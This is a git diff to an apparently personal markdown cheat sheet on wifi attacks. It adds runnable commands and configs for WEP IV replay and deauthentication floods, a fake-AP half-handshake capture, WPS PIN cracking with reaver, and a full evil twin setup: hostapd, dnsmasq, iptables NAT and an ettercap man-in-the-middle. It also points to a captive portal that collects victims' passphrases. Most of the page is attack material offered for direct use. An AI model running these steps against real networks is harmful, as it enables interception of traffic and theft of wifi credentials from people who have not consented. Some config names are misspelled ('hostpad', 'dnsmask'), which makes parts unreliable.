@@ -1,4 +1,4 @@
-import { Tab, Tabs } from 'nextra-theme-docs'
+import { Tab, Tabs,Callout } from 'nextra-theme-docs'
 
 ## Managing interfaces
 ### Interface status
@@ -49,6 +49,10 @@ iwconfig wlan0mon channel 1
 ### Connect to a wifi network
 ```bash filename="Terminal" copy
 nmcli dev wifi connect SSID_NAME password PASSWORD
+```
+### Obtain IP
+```copy bash filename="Terminal"
+dhclient wlan0 -v
 ```
 ### Monitor mode
 <Tabs items={['airmon-ng', 'iwconfig']}>
@@ -133,12 +137,13 @@ mdk4 wlan0mon p -t [BSSID] -f [ESSID-DIC]
 - Access points may reveal their names while connecting/reconnecting with clients, so we can either wait for a client to reconnect to that hiddne network, or we can force that by performing a **Deauth attack**
 
 ## Wifi Attacks
-### Packet Capture
+### General 
+#### Packet Capture
 ```bash filename="Terminal" copy
 sudo airodump-ng --band ag -w [outputfile] --gpsd wlan0mon
 sudo airodump-ng -c [channel] -w [outputfile] wlan0mon # focus on specific channel
 ```
-### Packet Injection
+#### Packet Injection
 - Test if the device supports packet Injection
 ```bash filename="Terminal" copy
 sudo aireplay-ng --test wlan0
@@ -235,30 +240,37 @@ Opportunistic wireless encryption, was introduced with WPA3 to prpotect OPN netw
 Wired Equivilent Privacy. was the first attempt to encrypt the wifi communications 1999.
 - Capturing and Cracking WEP traffic
 #### Accelerating IV capturing 
-1. Fake Authentication
-Sending fake authentication packets to the AP to collect more IVs
-```bash copy fielname="Terminal"
-aireplay-ng -1 0 -a <AP MAC> -h <Client MAC> wlan0mon
+1. **Fake Authentication**.
 
-```
-2. ARP Request Replay Attack (arpreplay)
-Capture valid ARP packets, then repeatedly re-inject them into the network.
-```bash copy fielname="Terminal"
-aireplay-ng --arpreplay -b <AP MAC> -h <Fake Client MAC> wlan0mon
-```
+    Sending fake authentication packets to the AP to collect more IVs
+    ```bash copy fielname="Terminal"
+    aireplay-ng -1 0 -a <AP MAC> -h <Client MAC> wlan0mon
+    ```
+2. **ARP Request Replay Attack (arpreplay)**
 
-3. Deauthentication Attacks
-Force clients to deautnenticate from the AP to force them to authenticate again then capture their IVs during the authentication processes
-```bash copy fielname="Terminal"
-aireplay-ng  -0 1000 -a <AP MAC> -c <Client MAC> wlan0mon
-```
+    Capture valid ARP packets, then repeatedly re-inject them into the network.
+    ```bash copy fielname="Terminal"
+    aireplay-ng --arpreplay -b <AP MAC> -h <Fake Client MAC> wlan0mon
+    ```
+
+3. **Deauthentication Attacks**
+
+    Force clients to deautnenticate from the AP to force them to authenticate again then capture their IVs during the authentication processes
+    ```bash copy fielname="Terminal"
+    aireplay-ng  -0 1000 -a <AP MAC> -c <Client MAC> wlan0mon
+    ```
+    Can be automated using [UnicastDeauth](https://github.com/mamatb/UnicastDeauth)
+    ```bash copy filename="Terminal"
+    UnicastDeauth.py -i wlan0 -e $ESSID -b
+    ```
 #### Dumping traffic
-```bash copy fielname="Terminal"
-airodumpp-ng -c channel_num -bssid BSSID -w output-file wlaGn0mon
-```
+    ```bash copy fielname="Terminal"
+    airodump-ng -c channel_num -bssid BSSID -w output-file wlan0mon
+    ```
 #### Cracking the key through the IVs
 ```bash copy fielname="Terminal"
 aircrack-ng capture.cap -b <AP-MAC> 
+```
 #### Automatic Attack
 ```bash copy fielname="Terminal"
 besside-ng -c 3 -b <AP-MAC> wlan0mon -v
@@ -291,14 +303,106 @@ sudo hcxpcapngtool -o capture.22000 capture.pcapng # convert it to a hashcat for
 sudo hashcat -m 22000 -a 0 capture.22000 /path/to/dictionary.txt # crack
 ```
 #### NoAP
-Also known as half-handshake attack
-#### WPS Pin
+Also known as half-handshake attack. So if the attack only requires the first 2 messages from the  handshake. and only the second message (sent by the client) is the one needed as its the one encrypted with the key. Why do we need the AP for ? Lets start our own AP based on clients probs
+1. **Prepare hostpad.conf**
+```c coyp filename="hostpad.conf" showLineNumbers
+interface=$INTERFACE
+driver=nl80211
+hw_mode=g
+channel=6
+ssid=$ESSID
+wpa=2
+wpa_key_mgmt=WPA-PSK
+wpa_pairwise=TKIP CCMP
+wpa_passphrase=12345678
+```
+2. **Start the fake AP**
+```copy bash filename="Terminal"
+hostpad hostpad.conf
+```
+**Automatic hostpad**
+```c showLineNumbers copy fileanme="hostpad.conf"
+interface=$INTERFACE
+driver=nl80211
+hw_mode=g
+channel=1
+ssid=$ESSID
+mana_wpaout=hostapd.hccapx
+wpa=2
+wpa_key_mgmt=WPA-PSK
+wpa_pairwise=TKIP CCMP
+wpa_passphrase=12345678
+```
+3. <a href="#psk">**Dump and Crack**</a> 
+
+#### WPS PIN
 ```bash copy fielname="Terminal"
-sudo wash -i wlan0mon # Identify networks with WPS enabled
+sudo wash -i wlan0mon 
 airodump-ng --wps # Identify networks with WPS enabled
 sudo reaver -i wlan0mon -b <BSSID> -vv # obtain the WPS pin and PSK key
 ```
-### Custom Dictionaries
+#### KRACK attack
+Key Reinstallation Attack. 
+Will be added
+#### FRAGAttack
+Fragmentation and Aggregation attacks
+Will be added
+### Evil Twin Attack
+1. Configure hostpad for fake AP 
+```c showLineNumbers filename="hostpad.conf"
+interface=$INTERFACE
+driver=nl80211
+ssid=$SSID
+hw_mode=g
+channel=$CHANNEL
+auth_algs=1
+wpa=3
+wpa_passphrase=$WPA_PASSPHRASE
+wpa_key_mgmt=WPA-PSK
+wpa_pairwise=TKIP
+rsn_pairwise=CCMP
 ```
+2. dnsmask for DHCP and DNS servers
+```c copy fileanem="dnsmask.conf"
+interface=$INTERFACE
+dhcp-range=192.168.2.2,192.168.2.100,12h
+dhcp-option=3,192.168.2.1
+dhcp-option=6,192.168.2.1
+server=8.8.8.8
+log-queries
+log-dhcp
+```
+3. Start  **dnsmask**
+```bash copy filename="Terminal"
+sudo dnsmasq -C dnsmasq.conf
+```
+4. Redirect victims traffic to the internet using iptables
+```bash copy filename="Terminal"
+sudo iptables --table nat --append POSTROUTING --out-interface eth0 -j MASQUERADE
+sudo iptables --append FORWARD --in-interface $INTERFACE -j ACCEPT
+```
+5. Enable packet forwarding on linux
+```bash copy filename="Terminal"
+sudo sysctl -w net.ipv4.ip_forward=1
+```
+6. MITM Attack
+```bash copy filename="Terminal"
+sudo ettercap -T -q -i $INTERFACE
+```
+6. Start hostapd
+```bash copy filename="Terminal"
+sudo hostapd hostapd.conf
+```
+
+<Callout type="info" emoji="👻">
+This fake Access Point can be configured to be OPN with a Captive portal asking users for PSK to login using [airgeddon](https://github.com/v1s1t0r1sh3r3/airgeddon)
+</Callout>
+
+### Traffic Decryption
+```bash copy filename="Terminal"
+airdecap-ng -e $ESSID -p $PASSWORD ~/wifi/scanc6-01.cap
+```
+### Custom Dictionaries
+```c
 cewl -d 2 -m 5 -w docswords.txt 
 ```
